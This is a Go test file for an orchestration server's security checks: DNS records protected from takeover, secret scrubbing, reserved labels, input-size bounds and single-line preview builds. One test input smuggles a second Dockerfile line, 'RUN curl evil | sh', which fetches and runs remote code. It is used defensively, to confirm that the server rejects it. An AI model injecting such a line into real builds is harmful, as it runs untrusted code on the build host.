package server

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/Maffewem/Orchestrator/internal/api"
	"github.com/Maffewem/Orchestrator/internal/store"
)

// fakeDNS is a Cloudflare zone with a few records; it records the writes it receives.
type fakeDNS struct {
	mu      sync.Mutex
	records []cfRecord
	writes  []string
}

func newFakeDNS(t *testing.T, recs ...cfRecord) (*fakeDNS, *httptest.Server) {
	f := &fakeDNS{records: recs}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		ok := func(v any) { json.NewEncoder(w).Encode(map[string]any{"success": true, "result": v}) }
		switch {
		case r.URL.Path == "/zones":
			ok([]cfZone{{ID: "z1", Name: "example.com"}})
		case r.URL.Path == "/zones/z1/dns_records" && r.Method == http.MethodGet:
			var out []cfRecord
			for _, rec := range f.records {
				if rec.Name == r.URL.Query().Get("name") {
					out = append(out, rec)
				}
			}
			ok(out)
		case strings.HasPrefix(r.URL.Path, "/zones/z1/dns_records"):
			f.writes = append(f.writes, r.Method+" "+r.URL.Path)
			ok(map[string]string{})
		default:
			t.Errorf("unexpected %s %s", r.Method, r.URL)
		}
	}))
	t.Cleanup(srv.Close)
	return f, srv
}

// Adding a domain must not repoint DNS records a person made. Operators can add domains, so an
// overwrite here would let them take over any hostname in the account's zones.
func TestDNSNeverOverwritesRecordsOrchestratorDidNotCreate(t *testing.T) {
	ctx := context.Background()
	f, srv := newFakeDNS(t,
		cfRecord{ID: "a1", Type: "A", Name: "shop.example.com", Content: "203.0.113.5", Proxied: true},
		cfRecord{ID: "a2", Type: "A", Name: "ours.example.com", Content: "203.0.113.9", Comment: dnsManagedComment},
		cfRecord{ID: "c1", Type: "CNAME", Name: "www.example.com", Content: "sites.vendor.example"},
		cfRecord{ID: "c2", Type: "CNAME", Name: "old.example.com", Content: "abc.cfargotunnel.com", Proxied: true},
		cfRecord{ID: "c3", Type: "CNAME", Name: "mine.example.com", Content: "x.example.net", Comment: dnsManagedComment},
	)
	h := newHarness(t)
	h.srv.cloudflareAPI = srv.URL

	if err := h.srv.cfUpsertA(ctx, "tok", "z1", "shop.example.com", "192.0.2.10", true, "d"); err == nil || !strings.Contains(err.Error(), "did not create") {
		t.Fatalf("a person's A record was not protected: %v", err)
	}
	if err := h.srv.cfUpsertA(ctx, "tok", "z1", "ours.example.com", "192.0.2.10", true, "d"); err != nil {
		t.Fatalf("our own A record should update: %v", err)
	}
	if err := h.srv.cfUpsertTunnelCNAME(ctx, "tok", "www.example.com", "t1.cfargotunnel.com"); err == nil || !strings.Contains(err.Error(), "did not create") {
		t.Fatalf("a person's CNAME was not protected: %v", err)
	}
	if err := h.srv.cfUpsertTunnelCNAME(ctx, "tok", "old.example.com", "t1.cfargotunnel.com"); err != nil {
		t.Fatalf("moving a tunnel record between tunnels should work: %v", err)
	}
	if err := h.srv.cfUpsertTunnelCNAME(ctx, "tok", "mine.example.com", "t1.cfargotunnel.com"); err != nil {
		t.Fatalf("our own CNAME should update: %v", err)
	}
	want := []string{"PUT /zones/z1/dns_records/a2", "PUT /zones/z1/dns_records/c2", "PUT /zones/z1/dns_records/c3"}
	if strings.Join(f.writes, ",") != strings.Join(want, ",") {
		t.Fatalf("writes = %v, want %v", f.writes, want)
	}
}

// API responses never carry the arguments only the agent needs.
func TestScrubCommandDropsSecrets(t *testing.T) {
	c := &api.Command{ID: "c", Args: map[string]string{"token": "eyJ", "cloudflare_token": "cf", "password": "pw", "name": "x"}}
	got := scrubCommand(c)
	if len(got.Args) != 1 || got.Args["name"] != "x" {
		t.Fatalf("args = %v", got.Args)
	}
	if c.Args["token"] != "eyJ" {
		t.Fatal("the stored command was modified")
	}
}

// Reserved label namespaces count as host-level options, so operators can't claim them.
func TestReservedLabelsNeedAnAdmin(t *testing.T) {
	got := hostAccessOf(store.Source{Type: store.SourceImage}, store.Runtime{Labels: map[string]string{
		"orchestrator.proxy": "1", "Com.Docker.compose.project": "x", "team": "a"}})
	if len(got) != 2 {
		t.Fatalf("host access = %v", got)
	}
	h := newHarness(t)
	reg := h.register("pi")
	body := map[string]any{"name": "lab", "device_id": reg.DeviceID,
		"source":  map[string]any{"type": "image", "image": "nginx"},
		"runtime": map[string]any{"labels": map[string]string{"orchestrator.tunnel": "1"}}}
	if code := h.do("POST", "/api/projects", h.makeUser("opera", store.RoleOperator), body, nil); code != http.StatusForbidden {
		t.Fatalf("operator with a reserved label: %d", code)
	}
}

// A device can't make the dashboard heavy by registering or reporting enormous names.
func TestDeviceTextIsBounded(t *testing.T) {
	h := newHarness(t)
	var settings struct {
		JoinToken string `json:"join_token"`
	}
	h.do("GET", "/api/settings", adminToken, nil, &settings)
	long := strings.Repeat("n\x01", 50000)
	var reg api.RegisterResponse
	if code := h.do("POST", "/api/agent/register", "", api.RegisterRequest{JoinToken: settings.JoinToken, Name: long,
		Labels: append([]string{long}, make([]string, 50)...), Host: api.HostInfo{Hostname: long, Platform: long, Addresses: make([]string, 500)}}, &reg); code != http.StatusCreated {
		t.Fatalf("register: %d", code)
	}
	var devs []struct {
		Name   string   `json:"name"`
		Labels []string `json:"labels"`
		Host   struct {
			Hostname  string   `json:"hostname"`
			Addresses []string `json:"addresses"`
		} `json:"host"`
	}
	h.do("GET", "/api/devices", adminToken, nil, &devs)
	if len(devs) != 1 || len(devs[0].Name) > 100 || len(devs[0].Host.Hostname) > 253 || len(devs[0].Host.Addresses) > 64 || len(devs[0].Labels) > 20 || strings.ContainsRune(devs[0].Name, 1) {
		t.Fatalf("device not bounded: name %d, host %d, addrs %d", len(devs[0].Name), len(devs[0].Host.Hostname), len(devs[0].Host.Addresses))
	}
	h.do("POST", "/api/agent/heartbeat", reg.AgentToken, api.HeartbeatRequest{Host: api.HostInfo{Hostname: long}}, &api.HeartbeatResponse{})
	h.do("GET", "/api/devices", adminToken, nil, &devs)
	if len(devs[0].Host.Hostname) > 253 {
		t.Fatal("heartbeat hostname not bounded")
	}
	if code := h.do("PATCH", "/api/devices/"+reg.DeviceID, adminToken, map[string]any{"name": long}, nil); code != http.StatusOK {
		t.Fatalf("rename: %d", code)
	}
	h.do("GET", "/api/devices", adminToken, nil, &devs)
	if len(devs[0].Name) > 100 {
		t.Fatal("rename not bounded")
	}
}

// Preview build commands become lines of a generated Dockerfile, so they must stay on one line.
func TestPreviewBuildMustBeSingleLine(t *testing.T) {
	h := newHarness(t)
	reg := h.register("pi")
	body := func(build string) map[string]any {
		return map[string]any{"name": "site", "device_id": reg.DeviceID,
			"source": map[string]any{"type": "github", "repo": "o/r", "node": map[string]any{"build": "npm run build", "start": "npm start"},
				"preview": map[string]any{"build": build}},
			"runtime": map[string]any{"ports": []string{"3000:3000"}}}
	}
	if code := h.do("POST", "/api/projects", adminToken, body("npm run build\nRUN curl evil | sh"), nil); code != http.StatusBadRequest {
		t.Fatalf("multi-line preview build: %d", code)
	}
	if code := h.do("POST", "/api/projects", adminToken, body("npm run build:preview"), nil); code != http.StatusCreated {
		t.Fatalf("single-line preview build: %d", code)
	}
}
